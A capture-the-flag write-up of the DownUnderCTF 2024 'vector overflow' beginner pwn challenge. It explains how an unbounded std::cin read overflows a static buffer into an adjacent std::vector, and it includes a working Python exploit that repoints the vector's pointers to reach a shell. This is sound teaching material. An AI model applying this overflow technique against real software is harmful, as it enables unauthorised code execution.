# vector overflow

- **Event:** DownUnderCTF 2024
- **Category:** pwn
- **Difficulty:** beginner
- **Author:** joseph

## Summary

"Please overflow into the vector and control it!" A small NoPIE C++ binary reads input into a fixed buffer with an unbounded `std::cin >> buf`, right next to a `std::vector` whose contents decide whether you reach the win path.

## First look

The handout ships the source (`publish/vector_overflow.cpp` points at `src/vector_overflow.cpp`), and the binary is not stripped, so there is nothing to guess about the layout:

```cpp
char buf[16];
std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};

void lose() {
    puts("Bye!");
    exit(1);
}

void win() {
    system("/bin/sh");
    exit(0);
}

int main() {
    char ductf[6] = "DUCTF";
    char* d = ductf;

    std::cin >> buf;
    if(v.size() == 5) {
        for(auto &c : v) {
            if(c != *d++) {
                lose();
            }
        }

        win();
    }

    lose();
}
```

```
$ nm src/vector_overflow | grep -E " buf$| v$"
00000000004051e0 B buf
00000000004051f0 B v
```

Reading the source closely, three conditions have to hold at once. The vector's `size()` must still be exactly 5 when the check runs (so `end - begin == 5` after my overwrite), the five bytes the vector points at must spell `DUCTF`, and only then does `win()` spawn a shell. Baseline behaviour first:

```
$ printf "hello\n" | ./src/vector_overflow; echo exit=$?
Bye!
exit=1
$ printf "DUCTF\n" | ./src/vector_overflow; echo exit=$?
Bye!
exit=1
```

Typing the right word changes nothing: `DUCTF` went into `buf`, but the check reads the vector, which still holds its own five `X` bytes on the heap. The input only matters if it reaches the vector object itself, 16 bytes past the start of `buf`: `buf` occupies `0x4051e0` to `0x4051f0`, and `v` sits immediately after it as three pointers, begin, end, capacity.

## What I tried first

The plan is to overflow into `v` and aim it back at `buf`, which starts with the bytes `DUCTF`. Two ways to get it wrong, both of which I ran:

**Overwrite begin only.** Sixteen bytes of filler plus the address of `buf` as the new begin pointer, leaving the vector's original end pointer in place. `size()` is now `end_original - buf`, an enormous number, so the size check fails and the program takes the `lose()` path. It also destroys the exit behaviour, see below.

**Pointers right, data wrong.** Begin at `buf`, end at `buf + 5`, capacity the same, but the buffer starts with `AAAAA` instead of `DUCTF`. Size check passes now, the element check does not.

Through a pipe, both runs look like this:

```
A) begin overwritten, end left alone: rc=-6 out='free(): invalid pointer\n'
B) begin=buf, end=buf+5, data 'AAAAA': rc=-6 out='free(): invalid pointer\n'
```

That output confused me for a minute: no `Bye!`, just a glibc abort. What is happening is exit-path noise. At program exit the vector's destructor tries to `free()` its begin pointer, which I have overwritten with the address of a static buffer, and glibc aborts with `free(): invalid pointer`. Through a pipe, stdout is fully buffered, so the buffered `Bye!` is discarded when the abort hits. Run the same payloads under a pty, where stdout is line buffered, and the real story shows:

```
A under a pty: 'AAAAAAAAAAAAAAAAQ@^@^@^@^@^@\r\nBye!\r\nfree(): invalid pointer\r\n'
B under a pty: 'AAAAAAAAAAAAAAAAQ@^@^@^@^@^@Q@^@^@^@^@^@Q@^@^@^@^@^@\r\nBye!\r\nfree(): invalid pointer\r\n'
```

Both dead ends did reach `lose()` and print `Bye!`, then died in the destructor on the way out. The abort is cosmetic, but only once you know it is the destructor and not the check crashing.

**Everything in one write.** With the correct payload, I first piped the shell command in the same write as the overflow:

```
C) payload + command in one write: rc=-6 out='free(): invalid pointer\n'
```

No flag. `std::cin` buffered the whole pipe into its own stream buffer while reading `buf`, so by the time `win()` spawns `/bin/sh`, the `cat flag.txt` bytes are already consumed into the C++ stream's buffer and the shell reads EOF and exits. The exploit has to be interactive: send the overflow, wait for the shell to exist, then send the command.

## The breakthrough

The layout arithmetic, once the three conditions are lined up: 16 bytes fill `buf` exactly (the first five are the payload data, `DUCTF`), then three pointers rewrite the vector: begin = `0x4051e0` (buf itself), end = begin + 5 (so `size()` is still 5), capacity = begin + 5 (harmless, keeps the object plausible). The element check then reads `DUCTF` out of my own input through the vector, and `win()` fires.

## Solve

```python
import struct
import subprocess
import time

BIN = "/home/hatch/workspace/ctf-work/lab/beginner/vector-overflow/src/vector_overflow"
CWD = "/home/hatch/workspace/ctf-work/lab/beginner/vector-overflow/src"
BUF = 0x4051e0


def p64(x):
    return struct.pack("<Q", x)


def run(payload, followup=None, delay=0.6, wait=2.0):
    p = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, cwd=CWD)
    p.stdin.write(payload + b"\n")
    p.stdin.flush()
    if followup is not None:
        time.sleep(delay)
        try:
            p.stdin.write(followup + b"\n")
            p.stdin.flush()
        except BrokenPipeError:
            pass
    try:
        out, _ = p.communicate(timeout=wait)
    except subprocess.TimeoutExpired:
        p.kill()
        out, _ = p.communicate()
    return p.returncode, out.decode(errors="ignore")


# Dead end A: overwrite begin only, leave the original end pointer.
pay = b"A" * 16 + p64(BUF)
rc, out = run(pay)
print(f"A) begin overwritten, end left alone: rc={rc} out={out!r}")

# Dead end B: pointers right (size stays 5), but the data is wrong.
pay = b"A" * 16 + p64(BUF) + p64(BUF + 5) + p64(BUF + 5)
rc, out = run(pay)
print(f"B) begin=buf, end=buf+5, data 'AAAAA': rc={rc} out={out!r}")

# The real payload: buf starts with the expected bytes DUCTF, and the
# vector is repointed at buf with size still 5.
pay = b"DUCTF" + b"A" * 11 + p64(BUF) + p64(BUF + 5) + p64(BUF + 5)

# Dead end C: everything in one write. std::cin has already buffered the
# command bytes, so the shell that win() spawns never sees them.
rc, out = run(pay + b"\ncat flag.txt")
print(f"C) payload + command in one write: rc={rc} out={out!r}")

# Working run: send the overflow, give win() time to spawn the shell,
# then send the command.
rc, out = run(pay, followup=b"cat flag.txt")
print(f"D) payload, pause, then 'cat flag.txt': rc={rc} out={out!r}")

# Why A and B showed no 'Bye!' through the pipe: stdout is fully buffered
# when piped, and the abort in the vector destructor (freeing the fake
# begin pointer, a static address) discards the buffer. Under a pty the
# 'Bye!' appears before the same abort.
import os
import pty


def run_pty(payload):
    pid, fd = pty.fork()
    if pid == 0:
        os.chdir(CWD)
        os.execv(BIN, [BIN])
    os.write(fd, payload + b"\n")
    time.sleep(0.5)
    out = b""
    try:
        while True:
            chunk = os.read(fd, 4096)
            if not chunk:
                break
            out += chunk
    except OSError:
        pass
    os.waitpid(pid, 0)
    return out.decode(errors="ignore")


pay_a = b"A" * 16 + p64(BUF)
print("A under a pty:", repr(run_pty(pay_a)))
pay_b = b"A" * 16 + p64(BUF) + p64(BUF + 5) + p64(BUF + 5)
print("B under a pty:", repr(run_pty(pay_b)))
```

Run:

```
$ python3 vector_solve.py
A) begin overwritten, end left alone: rc=-6 out='free(): invalid pointer\n'
B) begin=buf, end=buf+5, data 'AAAAA': rc=-6 out='free(): invalid pointer\n'
C) payload + command in one write: rc=-6 out='free(): invalid pointer\n'
D) payload, pause, then 'cat flag.txt': rc=-6 out='DUCTF{y0u_pwn3d_th4t_vect0r!!}\nfree(): invalid pointer\n'
A under a pty: 'AAAAAAAAAAAAAAAAQ@^@^@^@^@^@\r\nBye!\r\nfree(): invalid pointer\r\n'
B under a pty: 'AAAAAAAAAAAAAAAAQ@^@^@^@^@^@Q@^@^@^@^@^@Q@^@^@^@^@^@\r\nBye!\r\nfree(): invalid pointer\r\n'
```

Run D is the solve: the flag is printed by `cat flag.txt` inside the shell that `win()` spawned, and the trailing `free(): invalid pointer` is the same destructor abort on exit, after the flag is already out. It does not affect the result.

## Flag

```
DUCTF{y0u_pwn3d_th4t_vect0r!!}
```

Sanity check: the flag arrived as the output of a command executed in the shell the binary drops into on the win path, and the two control payloads show the win needs both halves right, the vector repointed at `buf` **and** `buf` starting with `DUCTF`. Either half alone gets `Bye!`.
